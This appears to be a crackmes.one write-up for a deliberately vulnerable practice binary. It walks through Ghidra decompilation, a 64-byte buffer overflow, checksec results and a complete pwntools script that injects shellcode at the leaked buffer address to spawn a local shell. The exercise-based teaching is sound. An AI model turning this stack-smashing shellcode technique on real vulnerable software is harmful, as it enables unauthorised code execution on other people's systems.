### [khaledddd](https://crackmes.one/user/khaledddd)'s InputPrinter - Simple Buffer  Overflow  Task
Platform: crackme.one

Language: C/C++

Platform: Unix/Linux

Difficulty: 2.0

Personal rating: 1.2

Binary exploitation task performed on a VirtualBox Debian 13 VM.


## Task Overview
Unpacking the archive  using the standard crackmes.one  password. This is an  x86-64  ELF  file. We will immediately  make  it  executable  using the command  `chmod  u+x  vuln.`

> xela@pcdeblin:~/crackme/pwn$ chmod u+x vuln

Using  the Ghidra program, let's  look  at the decompiled  code:

> void vuln(void)
> {   
>      char buf [64];
>      printf("%p\n",buf);   
>      fflush(stdout);   
>      read(0,buf,255);   
>      printf("you wrote: %s",buf);   return; 
> }

As  we can see, the program  uses  writing to a  buffer, the size of which is 64  bytes,  while  255  bytes  are  written  to  it.  This is where the overflow  occurs. There are no functions  where  we  need to jump,  so we need to write  shell-code  to  get a shell.
One  notable  detail: the author  intentionally  outputs the address of the buffer,  thereby  allowing you to immediately  jump  to  this  address  after  writing the shell  code.

Since the task is related  to  buffer  overflow, let's look  at the security  properties of this  executable  file  through the `checksec` command.

> xela@pcdeblin:~/crackme/pwn$ checksec --file=./vuln RELRO          
> STACK CANARY      NX            PIE             RPATH     
> RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE Partial RELRO   No
> canary found   NX disabled   No PIE          No RPATH   No RUNPATH  
> 40 Symbols	  No	0		2		./vuln

The  output  shows  that the canary  stack is missing,  which  means  we  can  easily  overwrite the return  address. NX  and  PIE are also  missing.  Disabled  NX  means  that the stack is executable,  and the absence of PIE  means  that the program  code  always  runs  from  the  same  address.

## Solution
All that remains is to write a shell  code  that will generate a payload  and  overwrite the return  address.  We  will  use  Python  and the pwntools library.

    from pwn import *  

Importing the 'pwntools' library

    elf = context.binary = ELF("./vuln")


Download the "vuln" binary file (Read the structure of this ELF file from disk into internal data structures (dictionaries, objects in Python memory).

    io = elf.process()


The local process starts and redirects the I/O streams to 'pipes'.  
Now we can manipulate the input and output of the process by reading its output into our script# and writing the input directly to the child process(./vuln).    

    leak = int(io.recvline().strip(), 16) 

Reading the output of the 'printf()' function' from the child process, which outputs the buffer address, then remove the extra characters (end of line) and convert this number to decimal.  
The second argument of the function 'int()' - 16 says that we are translating from the 16-digit number system. 
We write the resulting number to the "leak" variable.
  
 

    log.success(f"buf @ {hex(leak)}")  

Output the address of the buffer    

    shellcode = asm("sub rsp, 0x100") + asm(shellcraft.sh())  

We move the "RSP" register 256 bytes (0x100) lower.  
When the program terminates the vulnerable function and the 'ret' instruction is triggered (going to our return address), the processor transfers control directly to the address of our shellcode lying in the buffer. At this point, the RSP points exactly to the beginning of our shellcode.  If the shellcode starts working (for example, pushing some lines onto the stack), it will write data on top of itself, because there is no "empty" space under it - other data or the end of the stack immediately goes there.  That is why at the very beginning of the shellcode we write 
`sub rsp, 0x100`.  This "low" artificially lowers the top of the stack (RSP) even lower (256 bytes deep), freeing up a safe zone ("air") where the shellcode can freely use the stack without damaging itself.  
`'shellcraft.sh ()'` generates shell code and translates it into machine code.

    padding = 72 - len(shellcode)  

Counting padding. Since the buffer holds 64 bytes, we add its length to 8, which is 8 bytes of the RBP register, followed by the return address. Now it takes away the length of our shell code from the total length in order to know how many "garbage" bytes we need to write to the buffer.   

    payload = shellcode + (b'A' * padding) + pack(leak)  

The "payload" variable contains our data, which we will put into the buffer (shell code, "garbage" bytes, buffer address (from where the shell code execution will begin)     )

    io.sendline(payload)

 
 We write our "payload" into the input stream.
                                                                                                                                           
    io.interactive()  
                                                                                                                            

We transfer control to the terminal.

**Running the script:**

>     (.venv) xela@pcdeblin:~/crackme/pwn$ python3 shellcode.py 
>     [*]  '/home/xela/crackme/pwn/vuln
>     Arch:       amd64-64-little
>     RELRO:      Partial RELRO
>     Stack:      No canary found
>     NX:         NX unknown - GNU_STACK missing
>     PIE:        No PIE (0x400000)
>     Stack:      Executable
>     RWX:        Has RWX segments
>     Stripped:   No
>     Debuginfo:  Yes 
>     [+] Starting local process '/home/xela/crackme/pwn/vuln': pid 59066 
>     [+] buf @ 0x7ffe1fd01780 
>     [\*] Switching to interactive mode
>     $ ls shellcode.py  vuln
> 
We have successfully  received an interactive  shell!



















